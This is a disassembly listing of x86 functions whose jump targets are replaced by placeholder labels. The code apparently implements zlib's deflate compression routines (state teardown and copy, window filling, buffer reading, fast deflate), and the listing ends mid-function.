mov eax [ edx + 0x1c ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ edx + 0x8 ]
mov [ ecx + 0x10 ] edx
sub_405be5
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x71
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
cmp [ ecx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
cmp [ ebp - 0x4 ] 0x29a
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x3c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x24 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0x0
xor eax eax
cmp [ ebp - 0x4 ] 0x71
setne al
dec eax
and al 0xfd
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
sub_405cf6
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
mov esi [ ebp + 0xc ]
mov ecx 0xe
mov edi [ ebp + 0x8 ]
[ edi ] [ esi ]
push 0x16b8
push 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x1c ] ecx
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov ecx 0x5ae
[ edi ] [ esi ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
push 0x2
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x30 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x38 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
push 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405be5
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x30 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x38 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x3c ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x10 ]
sub ecx [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
shr eax 0x1
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax * 2 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x169c ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x1694 ]
imul edx edx 0x3
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + 0x1690 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x8c
mov ecx [ ebp - 0xc ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp - 0xc ]
add edx 0x980
mov eax [ ebp - 0xc ]
mov [ eax + 0xb1c ] edx
mov ecx [ ebp - 0xc ]
add ecx 0xa74
mov edx [ ebp - 0xc ]
mov [ edx + 0xb28 ] ecx
xor eax eax
sub_405f42
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov [ eax + ecx * 2 - 0x2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
lea eax [ edx + edx - 0x2 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
call memset
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x78 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x7c ]
imul eax eax 0xc
xor ecx ecx
mov cx [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x54 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] 0x0
pop ebp
retn
sub_406030
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] 0xffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
sub ecx 0x5
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x1
ja r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
sub eax 0x5
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x6c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_406270
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
cmp edx [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
cmp edx ecx
jb r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407f32
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_405b20
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x54 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x54 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407f32
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_405b20
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0xc ] 0x4
sete cl
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_407f32
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_405b20
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
sub_406270
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx - 0x106 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jb r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
add edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x68 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x68 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x54 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x54 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov eax [ ebp - 0x14 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x64 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + 0x6c ]
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_4064ab
add esp 0xc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x3
jb r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x106
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
xor eax eax
mov al [ edx + ecx ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx 0x2
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
mov dx [ ebp - 0x18 ]
mov [ ecx ] dx
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x34 ]
sub ecx [ eax + 0x6c ]
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x64 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x2
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dx [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov ax [ ebp - 0x1c ]
mov [ edx ] ax
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub_4064ab
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call sub_407520
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x30 ] eax
mov esp ebp
pop ebp
retn
sub_406543
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406270
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x3
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
cmp eax edx
ja r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov dl [ edx + ecx ]
mov [ ebp - 0x14 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x14 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x6c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x3
mov [ ebp - 0x10 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0xc ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x10 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0xc ]
sub dx 0x1
mov [ ebp - 0xc ] dx
mov eax [ ebp - 0x10 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x10 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0xc ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0xc ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_406a9a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
